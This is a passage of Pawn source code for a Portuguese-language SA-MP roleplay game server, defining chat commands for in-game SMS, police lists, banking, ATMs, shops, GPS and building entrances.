					SendClientMessage(id, AZUL_WE, gstring);
					PlayerPlaySound(id, 1085, 0.0, 0.0, 0.0);
					Help[id] = gettime();
				}
				else
				{
					SendClientMessage(playerid, COR_ERRO, "Você não pode ajudar você mesmo!");
				}
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
			}
		}
		return 1;
	}
	if(!strcmp(cmd, "/sms", true))
	{
	    if(aInfo[playerid][Admin] != 1 && aInfo[playerid][Moderador] != 1 && aInfo[playerid][Ajudante] != 1 && aInfo[playerid][Corregedor] != 1)
	    {
		    if(pInfo[playerid][Celular] != 1)
		    {
		        SendClientMessage(playerid, COR_ERRO, "Você não tem um celular!");
		        SendClientMessage(playerid, COR_ERRO, "Compre um celular na loja de utilitários!");
		        return 1;
		    }
		    else
			{
				if(pInfo[playerid][AFK] == true)
				{
					SendClientMessage(playerid, COR_ERRO, "Você não pode enviar e receber SMS ausente (AFK)!");
					return 1;
				}
			    if(pInfo[playerid][Celular_c] <= 0)
				{
			   	 	SendClientMessage(playerid, COR_ERRO, "Você não tem créditos de SMS!");
			    	SendClientMessage(playerid, COR_ERRO, "Compre créditos SMS para seu celular na loja de utilitários!");
					return 1;
				}
			}
		}

		tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /SMS [ID] [Mensagem]");
			return 1;
		}
		new
			id = strval(tmp)
		;

		if(id == playerid)
		{
			SendClientMessage(playerid, COR_ERRO, "Você não pode enviar SMS para você mesmo(a)!");
		    return 1;
		}

		if(!IsPlayerConnected(id))
		{
		    SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    return 1;
		}

		if(pInfo[id][AFK] == true)
		{
			format(gStr, sizeof(gStr), "O(A) jogador(a) {FFFFFF}%s {FF0000} está ausente (AFK) e não pode receber SMS!", PlayerName(id));
			SendClientMessage(playerid, COR_ERRO, gStr);
			return 1;
		}

		if(PMBLOQUEADO[id] == 1)
		{
			format(gStr, sizeof(gStr), "O(A) jogador(a) {FFFFFF}%s {FF0000} está bloqueado e não pode receber SMS!", PlayerName(id));
			SendClientMessage(playerid, COR_ERRO, gStr);
			return 1;
		}

		if(pInfo[id][Celular] != 1)
		{
		    format(gStr, sizeof(gStr), "O(A) jogador(a) {FFFFFF}%s {FF0000}não tem celular!", PlayerName(id));
			SendClientMessage(playerid, COR_ERRO, gStr);
			return 1;
		}

		new
			length = strlen(cmdtext)
		;
		while ((idx < length) && (cmdtext[idx] <= ' '))
		{
			idx++;
		}
		new offset = idx;
		new result[64];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = cmdtext[idx];
			idx++;
		}
		result[idx - offset] = EOS;

		if(!strlen(result))
      	{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /SMS [ID] [Mensagem]");
			return 1;
      	}

      	if(strlen(result) > 60)
		{
		    SendClientMessage(playerid, COR_ERRO, "SMS muito grande, envie SMS de no máximo 60 caracteres!");
		    return 1;
		}
		if(aInfo[playerid][Admin] != 1 && aInfo[playerid][Moderador] != 1 && aInfo[playerid][Ajudante] && aInfo[playerid][Corregedor] != 1)
		{
			pInfo[playerid][Celular_c] --;
		}
		format(gstring, 256, "SMS para %s [%d]:{FFFFFF} %s", PlayerName(id), id, result);
		SendClientMessage(playerid, AZUL_WE, gstring);
		PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);

		format(gstring, 256, "SMS de %s [%d]:{FFFFFF} %s", PlayerName(playerid), playerid, result);
		SendClientMessage(id, AZUL_WE, gstring);
		PlayerPlaySound(id, 1085, 0.0, 0.0, 0.0);

		return 1;
	}
	if(!strcmp(cmd, "/vips", true))
	{
		new v;
		SendClientMessage(playerid, COR_AMARELO, "VIPS online");
		foreach(Player, i)
		{
			if(pInfo[i][PLAYER_VIP] == 1)
			{
				++v;
				format(gStr, sizeof(gStr), " %s [ID: %d]", PlayerName(i), i);
				SendClientMessage(playerid, COR_BRANCO, gStr);
			}
		}
		if(v <= 0)
		{
			SendClientMessage(playerid, COR_ERRO, "Nennhum(a) jogador(a) VIP online no momento.");
		}
  		return 1;
    }
	if(!strcmp(cmd, "/procurados", true))
	{
		if(pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || PlayerToPoint(1.1, playerid, 1567.8768,-1675.5853,16.2505))
	    {
	        new p;
		   	SendClientMessage(playerid, COR_AZULCLARO, "Lista de criminosos");
			foreach(Player, i)
			{
				if(GetPlayerWantedLevel(i) > 0)
				{
					++p;
					format(gStr, sizeof(gStr), " %s [%d] Nível de procurado: %d", PlayerName(i), i, GetPlayerWantedLevel(i));
					SendClientMessage(playerid, COR_BRANCO, gStr);
				}
			}
			if(p <= 0) return SendClientMessage(playerid, COR_AZULCLARO, "Nennhum jogador sendo procurado no momento.");
		}
 		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não é um(a) policial, para ver os jogadores procurados somente na delegacia!");
		}
  		return 1;
    }
	if(!strcmp(cmd, "/presos", true))
	{
		if(pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || PlayerToPoint(1.1, playerid, 1567.8768,-1675.5853,16.2505))
	    {
	        new p;
		   	SendClientMessage(playerid, COR_AZULCLARO, "Jogadores presos");
			foreach(Player, i)
			{
				if(pInfo[i][Preso] >= 1)
				{
					++p;
					new
						d_Horas1,
						d_Minut1,
						d_Segun1
					;
					formatSeconds(pInfo[i][Preso], d_Horas1, d_Minut1, d_Segun1);
					format(gStr, sizeof(gStr), " %s [%d] - Tempo: %d horas, %d minutos e %d segundos.", PlayerName(i), i, d_Horas1, d_Minut1, d_Segun1);
					SendClientMessage(playerid, COR_BRANCO, gStr);
				}
			}
			if(p <= 0) return SendClientMessage(playerid, COR_AZULCLARO, "Nennhum jogador preso no momento.");
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não é um(a) policial, para ver os jogadores presos somente na delegacia!");
		}
  		return 1;
    }
	if(!strcmp(cmd, "/policiais", true) || !strcmp(cmd, "/oficiais", true))
	{
     	new p;
		SendClientMessage(playerid, COR_AZULCLARO, "Oficiais online");
		foreach(Player, i)
		{
			if(getPolicial(i))
			{
				++p;
				format(gStr, sizeof(gStr), " %s [%d] - Patente: %s.", PlayerName(i), i, NomePatente(i));
				SendClientMessage(playerid, COR_BRANCO, gStr);
			}
		}
		if(p <= 0) return SendClientMessage(playerid, COR_AZULCLARO, "Nennhum oficial online no momento.");
  		return 1;
    }
    if(!strcmp(cmd, "/padvogado", true))
    {
        if(pInfo[playerid][Preso] <= 0)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está preso, portando não pode chamar os advogados!");
		    return 1;
		}
  		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		if(WE_GetInt(gFile, "SaldoBanco") < 5000)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você precisa ter R$5000 no banco para poder chamar um advogado!");
		    return 1;
		}
  		if(cAdvogadop[playerid] > gettime())
		{
		    format(gStr, sizeof(gStr), "Aguarde %d segundos para solicitar novamente os(as) advogados(as)!", cAdvogadop[playerid] - gettime());
		    SendClientMessage(playerid, COR_ERRO, gStr);
			return 1;
		}
		foreach(Player, i)
		{
        	if(pInfo[i][Prof] == ADVOGADO || aInfo[i][Admin] == 1)
          	{
           		format(gStr, sizeof(gStr), "%s [%d], está a procura de um(a) advogado(a).", PlayerName(playerid), playerid);
              	SendClientMessage(i, COR_AMARELO, gStr);
       		}
        }
        cAdvogadop[playerid] = gettime() + 15;
        return 1;
    }
	if(!strcmp(cmd, "/ausentes", true))
	{
	    new a;
	    SendClientMessage(playerid, COR_AZULCLARO, " Lista de jogadores ausentes (AFK) ");
		foreach(Player, i)
		{
			if(pInfo[i][AFK] == true)
			{
				++a;
				format(gStr, sizeof(gStr), " %s [%d]", PlayerName(i), i);
				SendClientMessage(playerid, COR_BRANCO, gStr);
			}
		}
		if(a <= 0) return SendClientMessage(playerid, COR_AZULCLARO, "Nenhum jogador ausente no momento.");
  		return 1;
    }
	if(!strcmp(cmd, "/sairafk", true))
	{
		if(pInfo[playerid][AFK] == true)
		{
   			SendClientMessage(playerid, COR_BRANCO, "(ANTI-AFK) Desbloqueado(a)!");
			if(IsPlayerInAnyVehicle(playerid))
    		{
    			TextDrawShowForPlayer(playerid, Velocimetro0[playerid]);
    			TextDrawShowForPlayer(playerid, Velocimetro1[playerid]);
    			TextDrawShowForPlayer(playerid, Velocimetro2[playerid]);
    			TextDrawShowForPlayer(playerid, Velocimetro3[playerid]);
    			TextDrawShowForPlayer(playerid, Velocimetro4[playerid]);
    			TextDrawShowForPlayer(playerid, Velocimetro5[playerid]);
    			TextDrawShowForPlayer(playerid, Velocimetro6[playerid]);
                TextDrawShowForPlayer(playerid, Velocimetro7[playerid]);
				TextDrawShowForPlayer(playerid, Velocimetro8[playerid]);
			}
  			TextDrawHideForPlayer(playerid, AFK1);
			TextDrawHideForPlayer(playerid, AFK2);
			if(pInfo[playerid][NeedsOff] == true)
			{
				ContagemFome[playerid] = SetTimerEx("Fome", 216000, true, "i", playerid);
				ContagemSede[playerid] = SetTimerEx("Sede", 80000, true, "i", playerid);
				ContagemSono[playerid] = SetTimerEx("Sono", 900000, true, "i", playerid);
				pInfo[playerid][NeedsOff] = false;
			}
			pInfo[playerid][AFK] = false;
        }
	    else
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não está AFK!");
	    }
	    return 1;
	}
	if(!strcmp(cmd, "/voltar", true))
	{
	    if(pInfo[playerid][Continuar] == false)
		{
		    SendClientMessage(playerid, COR_ERRO, "Seu tempo acabou e você não pode mais usar esse comando!");
			return 1;
		}
		SendClientMessage(playerid, COR_AMARELO, "Você foi levado até sua ultima posição salva.");
		if(pInfo[playerid][Preso] >= 1)
		{
			SendClientMessage(playerid, COR_MUSGO, "Você não cumpriu sua pena!");
			SetPrisao(playerid);
		}
		else
		{
			SetPlayerPos(playerid, pInfo[playerid][ContX], pInfo[playerid][ContY], pInfo[playerid][ContZ]);
			SetPlayerFacingAngle(playerid, pInfo[playerid][ContW]);
			SetPlayerInterior(playerid, pInfo[playerid][ContI]);
		}
		pInfo[playerid][Continuar] = false;
		SetCameraBehindPlayer(playerid);
		if(pInfo[playerid][PLAYER_VIP] == 0)
		{
			KillTimer(ContinTimer[playerid]);
		}
		return 1;
	}
	if(!strcmp(cmd, "/banco", true))
	{
        if(!IsPlayerInDynamicCP(playerid, CP_1))
        {
			SendClientMessage(playerid, COR_ERRO, "Você não está em um banco!");
            return 1;
        }
        if(bRoubado == true)
            return SendClientMessage(playerid, COR_ERRO, "O banco foi assaltado recentemente, use um caixa até que tudo se normalize!");
		if(BancoLogin[playerid] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Para acessar o banco é preciso que você efetue o login em sua conta! (/LogarConta)");

        format(gStr, sizeof(gStr), "Seja bem-vindo(a) ao banco\n\nNome de usuário: %s\n\nQual operação deseja realizar?", PlayerName(playerid));
        ShowPlayerDialog(playerid, D_iBANCO, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Banco Central", gStr, "Saldo", "Transação");
		return 1;
	}
	if(!strcmp(cmd, "/caixa", true))
	{
     	if(!PlayerToPoint(1.1, playerid, 1780.3077,-1704.3605,10.5629) &&
		!PlayerToPoint(1.1, playerid, 1401.8698, -1177.8055, 25.9922) &&
		!PlayerToPoint(1.1, playerid, 2005.8110, -1409.0641, 16.9922) &&
		!PlayerToPoint(1.1, playerid, 1929.2642, -1769.0115, 13.5469) &&
		!PlayerToPoint(1.1, playerid, 1363.0376, -1750.0898, 13.5274) &&
		!PlayerToPoint(1.1, playerid, 1145.6055, -1772.0370, 16.5992) &&
		!PlayerToPoint(1.1, playerid, 397.5773, -1805.5364, 7.8379) &&
		!PlayerToPoint(1.1, playerid, 1286.1268, -1305.7277, 13.5470) &&
		!PlayerToPoint(1.1, playerid, 1985.3488, 1075.9269, 10.8127) &&
		!PlayerToPoint(1.1, playerid, 2086.7527, 1471.3977, 10.8203) &&
		!PlayerToPoint(1.1, playerid, 1673.8544, 1444.8619, 10.7920) &&
		!PlayerToPoint(1.1, playerid, 2172.4304, 1402.2052, 11.0625) &&
		!PlayerToPoint(1.1, playerid, 2803.6138, 892.6180, 10.7500) &&
		!PlayerToPoint(1.1, playerid, -2702.8171, 372.6496, 4.9781) &&
		!PlayerToPoint(1.1, playerid, -2446.7327, 751.8239, 35.1719) &&
		!PlayerToPoint(1.1, playerid, -2629.7937, 1401.6936, 7.0994) &&
		!PlayerToPoint(1.1, playerid, -1694.3392, 412.6917, 7.1797) &&
		!PlayerToPoint(1.1, playerid, -1968.2924, 278.5286, 35.1794) &&
		!PlayerToPoint(1.1, playerid, -2234.2275, 2350.0652, 4.9855) &&
		!PlayerToPoint(1.1, playerid, -1453.6864, 2593.2837, 55.8359) &&
		!PlayerToPoint(1.1, playerid, -230.0132, 2709.8633, 62.9843) &&
		!PlayerToPoint(1.1, playerid, -828.2064, 1503.2640, 19.6672) &&
		!PlayerToPoint(1.1, playerid, -189.9725, 1209.8292, 19.7422) &&
		!PlayerToPoint(1.1, playerid, 241.5081, -167.8019, 1.5781) &&
		!PlayerToPoint(1.1, playerid, 673.0540, -506.8918, 16.3359) &&
		!PlayerToPoint(1.1, playerid, -2162.7546, -2341.4189, 30.6250) &&
		!PlayerToPoint(1.1, playerid, 2303.1123, -16.1575, 26.4844) &&
		!PlayerToPoint(1.1, playerid, 1306.2826, 232.1539, 19.5547))
        {
			SendClientMessage(playerid, COR_ERRO, "Você não está em um Caixa Eletrônico.");
            return 1;
        }
        if(BancoLogin[playerid] == 0)
        {
            SendClientMessage(playerid, COR_ERRO, "(BANCO) Para acessar o caixa eletrônico é necessário efetuar o login em sua conta! (/LogarConta)");
			return 1;
		}
        format(gStr, sizeof(gStr), "Seja bem-vindo(a) ao banco\n\nNome de usuário: %s\n\nQual operação deseja realizar?", PlayerName(playerid));
        ShowPlayerDialog(playerid, D_iBANCO, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Caixa Eletrônico", gStr, "Saldo", "Transação");
		return 1;
	}
	if(!strcmp(cmd, "/abrirconta", true))
	{
        if(!IsPlayerInDynamicCP(playerid, CP_1))
        {
			SendClientMessage(playerid, COR_ERRO, "Você não está no Banco Central.");
            return 1;
        }
		if(pInfo[playerid][ContaBanco] == 1)
        {
			SendClientMessage(playerid, COR_AMARELO, "* Você já tem uma conta no banco, para acessa-lá digite: '/LogarConta'.");
			return 1;
        }
        format(gStr, sizeof(gStr), "Conta Bancária\n\nNome de usuário: %s\n\nInsira uma senha bancária:", PlayerName(playerid));
        ShowPlayerDialog(playerid, D_CONTABANCO, DIALOG_STYLE_INPUT, "Conta Bancária", gStr, "Criar", "Cancelar");
		return 1;
	}
	if(!strcmp(cmd, "/logarconta", true))
	{
     	if(!PlayerToPoint(1.1, playerid, 1780.3077,-1704.3605,10.5629) &&
		!PlayerToPoint(1.1, playerid, 1401.8698, -1177.8055, 25.9922) &&
		!PlayerToPoint(1.1, playerid, 2005.8110, -1409.0641, 16.9922) &&
		!PlayerToPoint(1.1, playerid, 1929.2642, -1769.0115, 13.5469) &&
		!PlayerToPoint(1.1, playerid, 1363.0376, -1750.0898, 13.5274) &&
		!PlayerToPoint(1.1, playerid, 1145.6055, -1772.0370, 16.5992) &&
		!PlayerToPoint(1.1, playerid, 397.5773, -1805.5364, 7.8379) &&
		!PlayerToPoint(1.1, playerid, 1286.1268, -1305.7277, 13.5470) &&
		!PlayerToPoint(1.1, playerid, 1985.3488, 1075.9269, 10.8127) &&
		!PlayerToPoint(1.1, playerid, 2086.7527, 1471.3977, 10.8203) &&
		!PlayerToPoint(1.1, playerid, 1673.8544, 1444.8619, 10.7920) &&
		!PlayerToPoint(1.1, playerid, 2172.4304, 1402.2052, 11.0625) &&
		!PlayerToPoint(1.1, playerid, 2803.6138, 892.6180, 10.7500) &&
		!PlayerToPoint(1.1, playerid, -2702.8171, 372.6496, 4.9781) &&
		!PlayerToPoint(1.1, playerid, -2446.7327, 751.8239, 35.1719) &&
		!PlayerToPoint(1.1, playerid, -2629.7937, 1401.6936, 7.0994) &&
		!PlayerToPoint(1.1, playerid, -1694.3392, 412.6917, 7.1797) &&
		!PlayerToPoint(1.1, playerid, -1968.2924, 278.5286, 35.1794) &&
		!PlayerToPoint(1.1, playerid, -2234.2275, 2350.0652, 4.9855) &&
		!PlayerToPoint(1.1, playerid, -1453.6864, 2593.2837, 55.8359) &&
		!PlayerToPoint(1.1, playerid, -230.0132, 2709.8633, 62.9843) &&
		!PlayerToPoint(1.1, playerid, -828.2064, 1503.2640, 19.6672) &&
		!PlayerToPoint(1.1, playerid, -189.9725, 1209.8292, 19.7422) &&
		!PlayerToPoint(1.1, playerid, 241.5081, -167.8019, 1.5781) &&
		!PlayerToPoint(1.1, playerid, 673.0540, -506.8918, 16.3359) &&
		!PlayerToPoint(1.1, playerid, -2162.7546, -2341.4189, 30.6250) &&
		!PlayerToPoint(1.1, playerid, 2303.1123, -16.1575, 26.4844) &&
		!PlayerToPoint(1.1, playerid, 1306.2826, 232.1539, 19.5547) &&
		!IsPlayerInDynamicCP(playerid, CP_1))
        {
			SendClientMessage(playerid, COR_ERRO, "Você não está em um Banco/Caixa Eletrônico.");
            return 1;
        }
        if(BancoLogin[playerid] == 1)
        {
			SendClientMessage(playerid, COR_AMARELO, "Você já está logado em sua conta bancária.");
			return 1;
        }
		if(pInfo[playerid][ContaBanco] == 0)
        {
			SendClientMessage(playerid, COR_ERRO, "Você não tem uma conta no banco, para cria-lá digite: '/AbrirConta'");
			return 1;
        }
        format(gStr, sizeof(gStr), "Conta Bancária\n\nNome de usuário: %s\n\nInsira sua senha bancária:", PlayerName(playerid));
        ShowPlayerDialog(playerid, D_LOGINBANCO, DIALOG_STYLE_INPUT, "Conta Bancária", gStr, "Entrar", "Cancelar");
		return 1;
	}
	if(!strcmp(cmd, "/senhabanco", true))
	{
	    if(!PlayerToPoint(1.1, playerid, 1780.3077,-1704.3605,10.5629))
        {
			SendClientMessage(playerid, COR_ERRO, "Você não está no Banco Central.");
            return 1;
        }
        if(BancoLogin[playerid] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Para acessar o banco é necessário efetuar o login em sua conta bancária! (/LogarConta)");
        ShowPlayerDialog(playerid, D_SENHABANCO, DIALOG_STYLE_INPUT, "Conta Bancária", "Conta Bancária\n\nInsira sua senha atual:", "Confirmar", "Cancelar");
		return 1;
	}
	if(strcmp(cmd, "/vNome", true) == 0)
	{
		format(gStr, sizeof(gStr), "O nome do veículo que você está é %s.", vNome[GetVehicleModel(GetPlayerVehicleID(playerid))-400]);
		SendClientMessage(playerid, COR_LARANJA, gStr);
		return 1;
	}
	if(strcmp(cmd, "/vID", true) == 0)
	{
		format(gStr, sizeof(gStr), "O ID do veículo que você está é %d.", GetVehicleModel(GetPlayerVehicleID(playerid)));
		SendClientMessage(playerid, COR_LARANJA, gStr);
		return 1;
	}
	if(!strcmp(cmd, "/empregos", true) || !strcmp(cmd, "/profs", true) || !strcmp(cmd, "/profissoes", true))
	{
		if(PlayerToPoint(1.1, playerid, 246.6424, 118.2427, 1003.2188)) // Agência CP_23
		{
            ShowPlayerDialog(playerid, D_PROFS, DIALOG_STYLE_LIST, "Empregos", "{FFFF00}1- {F1C259}Serviços Particulares\n{FFFF00}2- {FFFFFF}Transportes Público\n{FFFF00}3- {FFFFFF}Transportes\n{FFFF00}{FFFF00}4- {4390C3}Segurança Pública\n{FFFF00}5- {FFBDD7}Servidores Públicos\n{FFFF00}6- {F1DD0F}Governamentais\n{FFFF00}7- {F41A00}Desonestos\n{FFFF00}8- {FFFFFF}Honestos", "Ver", "Sair");
		}
		else SendClientMessage(playerid, COR_ERRO, "Você não está na Agência de Empregos!");
		return 1;
	}
	if(!strcmp(cmd, "/licencas", true))
	{
		if(IsPlayerInDynamicCP(playerid, CP_2)) // AutoEscoola
		{
			ShowPlayerDialog(playerid, D_AUTOE, DIALOG_STYLE_LIST, "Auto Escola", "{1E90FF}1. {FFFFFF}Habilitações Terrestres\n{1E90FF}2. {FFFFFF}Habilitação Náutica\n{1E90FF}3. {FFFFFF}Habilitações Aéreas", "Selecionar", "Sair");
		}
		else SendClientMessage(playerid, COR_ERRO, "Você não está na Auto Escola!");
		return 1;
	}
	if(!strcmp(cmd, "/Utilitarios", true))
	{
		if(PlayerToPoint(1.1, playerid, -28.1784, -185.1464, 1003.5469)) // Utilitários
		{
			ShowPlayerDialog(playerid, D_UTILI, DIALOG_STYLE_LIST, "Utilitários", "{1E90FF}1. {FFFFFF}Celular - {3DB134}R$5000\n{1E90FF}2. {FFFFFF}Créditos para SMS - {3DB134}R$10 reais/SMS\n{1E90FF}3. {FFFFFF}Capacete - {3DB134}R$2000\n{1E90FF}4. {FFFFFF}Localizador/GPS - {3DB134}R$15000", "Comprar", "Sair");
		}
		else SendClientMessage(playerid, COR_ERRO, "Você não está na Loja de Utilitários!");
		return 1;
	}
	if(!strcmp(cmd, "/gps", true))
	{
		ShowPlayerDialog(playerid, D_GPSL1, DIALOG_STYLE_LIST, "GPS - Selecione a cidade", "Los Santos\nSan Fierro\nLas Venturas\n{FF0000}Desligar GPS", "Abrir", "Sair");
		return 1;
	}
	if(!strcmp(cmd, "/hospital", true))
	{
	    if(PlayerToPoint(1.0, playerid, 1172.6395,-1328.1166,15.4027) || PlayerToPoint(1.0, playerid,2034.8190,-1406.5873,17.2047) || PlayerToPoint(1.0, playerid, -318.2591,1048.8253,20.3403) || PlayerToPoint(1.0, playerid, -2655.0383,638.5671,14.4531) || PlayerToPoint(1.0, playerid, -2209.0784,-2287.7100,30.6250) || PlayerToPoint(1.0, playerid, 1615.1281,1817.3341,10.8203) || PlayerToPoint(1.0, playerid, -1514.8173,2519.9592,55.9913))
		{
			ShowPlayerDialog(playerid, D_HOSPI, DIALOG_STYLE_LIST, "Serviços Hospitalares", "{FFF000}1. {FFFFFF}Convênio Hospitalar - {3DB134}R$5000\n{FFF000}2. {FFFFFF}Seguro de Acidentes - {3DB134}R$10000", "Comprar", "Sair");
		}
	    else
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não está em um hospital!");
	    }
  		return 1;
	}
	if(!strcmp(cmd, "/armasfavela", true))
	{
	    if(PlayerToPoint(1.0, playerid, 2201.8445, -1152.3496, 25.8772))
		{
			ShowPlayerDialog(playerid, D_FAVEL, DIALOG_STYLE_LIST, "Menu da Armas", "\tConjunto de Armas - {3DB134}R$27.500\n\t{FF0000}Remover Armas", "OK", "Sair");
		}
	    else
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não está no ponto de compras!");
	    }
  		return 1;
	}
	if(!strcmp(cmd, "/tempo", true))
	{
		if(aInfo[playerid][Admin] == 1)
		{
			ShowPlayerDialog(playerid, D_TEMPO, DIALOG_STYLE_LIST, "Tempo", "\tManha\n\tTarde\n\tNoite\n\tMadrugada", "Esse", "Sair");
			return 1;
		}
	}
	if(!strcmp(cmd, "/mudarluta", true) || !strcmp(cmd, "/lutar", true) || !strcmp(cmd, "/lutas", true))
	{
		if(PlayerToPoint(1.1, playerid, 775.2586, -59.2147, 1000.7184)) // Academia
		{
            ShowPlayerDialog(playerid, D_LUTAS, DIALOG_STYLE_LIST, "Luta {3DB134}Preço", "\tBoxe - {3DB134}R$1000\n\tKung Fu - {3DB134}R$1000\n\tBriga de Rua - {3DB134}R$1000\n\tAgarrar e Chutar - {3DB134}R$1000\n\tNormal - {3DB134}R$1000", "Lutar", "Sair");
		}
		else SendClientMessage(playerid, COR_ERRO, "Você não está no Ginásio de Lutas!");
		return 1;
	}
	if(!strcmp(cmd, "/entrar", true))
	{
		if(pHospital[playerid] > gettime())
		{
			return 1;
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 1310.4525,-1367.4639,13.4724)) // Agência LS
		{
		    SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
		    SetPlayerFacingAngle(playerid, 359.6873);
		    SetPlayerInterior(playerid, 10);
		    pInfo[playerid][EntrouL] = true;
		    pInfo[playerid][EntrouAgencia] = 1;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, -2227.2854, 251.9700, 35.3203)) // Agência SF
		{
		    SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
		    SetPlayerFacingAngle(playerid, 359.6873);
		    SetPlayerInterior(playerid, 10);
		    pInfo[playerid][EntrouL] = true;
		    pInfo[playerid][EntrouAgencia] = 2;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1551.5126,-1616.4089,13.3828)) // Para a prisão
		{
		    SetPlayerPos(playerid, 1578.8885,-1663.0897,2.0466);
		    SetPlayerInterior(playerid, 0);
		    GameTextForPlayer(playerid, "~w~Prisao", 3000, 1);
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1952.8214, 1342.8403, 15.3672)) // Agência LV
		{
		    SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
		    SetPlayerFacingAngle(playerid, 359.6873);
		    SetPlayerInterior(playerid, 10);
		    SetPlayerVirtualWorld(playerid, 1);
		    pInfo[playerid][EntrouL] = true;
		    pInfo[playerid][EntrouAgencia] = 3;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, -206.9538,1119.1993,20.4297)) // Agência de Fort Carson
		{
		    SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
		    SetPlayerFacingAngle(playerid, 359.6873);
		    SetPlayerInterior(playerid, 10);
		    pInfo[playerid][EntrouL] = true;
		    pInfo[playerid][EntrouAgencia] = 4;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
 		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 207.8856, -62.8081, 1.5781)) // Agência de Blueberry
		{
		    SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
		    SetPlayerFacingAngle(playerid, 359.6873);
		    SetPlayerInterior(playerid, 10);
		    pInfo[playerid][EntrouL] = true;
		    pInfo[playerid][EntrouAgencia] = 5;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
  		else if(IsPlayerInRangeOfPoint(playerid, 2.0, -2130.4309,-2434.8296,30.6250)) // Agência de Angel Pine
		{
		    SetPlayerPos(playerid, 246.375991,109.245994,1003.218750);
		    SetPlayerFacingAngle(playerid, 359.6873);
		    SetPlayerInterior(playerid, 10);
		    pInfo[playerid][EntrouL] = true;
		    pInfo[playerid][EntrouAgencia] = 6;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 2232.8218,-1333.2921,23.9816))
		{
		    SetPlayerPos(playerid, 2235.7280,-1334.2772,24.0924);
		    SetPlayerFacingAngle(playerid, 268.8935);
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1555.1055, -1675.6426, 16.1953)) // Delegacia LS
		{
		    SetPlayerPos(playerid, 1560.7961,-1675.6205,16.2505);
	      	pInfo[playerid][EntrouL] = true;
	      	SetCameraBehindPlayer(playerid);
	      	pInfo[playerid][entrouDEL] = 1;
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, -1605.4912, 711.4242, 13.8672)) // Delegacia SF
		{
		    SetPlayerPos(playerid, 246.8718, 62.3202, 1003.6406);
		    SetPlayerInterior(playerid, 6);
		    SetPlayerVirtualWorld(playerid, 1);
	      	pInfo[playerid][EntrouL] = true;
	      	SetCameraBehindPlayer(playerid);
	      	pInfo[playerid][entrouDEL] = 2;
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1836.5631, -1682.5184, 13.3427)) // Alhambra
		{
		    SetPlayerPos(playerid, 493.4367, -24.9197, 1000.6719);
		    SetPlayerInterior(playerid, 17);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
 		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 2127.5425, 2378.9783, 10.8203)) // Banco LV
		{
      		SetPlayerPos(playerid, 2127.5425, 2378.9783, 10.8203);
		    SetPlayerFacingAngle(playerid, 135.9976);
		    SetPlayerInterior(playerid, 0);
		    pInfo[playerid][EntrouL] = true;
		    pInfo[playerid][EntrouAgencia] = 1;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
 		else if(IsPlayerInRangeOfPoint(playerid, 2.0, -2425.3201, 337.5206, 37.0020)) // Banco SF
		{
		    SetPlayerPos(playerid, -2425.3201, 337.5206, 37.0020);
		    SetPlayerFacingAngle(playerid, 135.9976);
		    SetPlayerInterior(playerid, 0);
		    pInfo[playerid][EntrouL] = true;
		    pInfo[playerid][EntrouAgencia] = 2;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1657.9943, -1343.3003, 17.4365)) // Auto Escola LS
		{
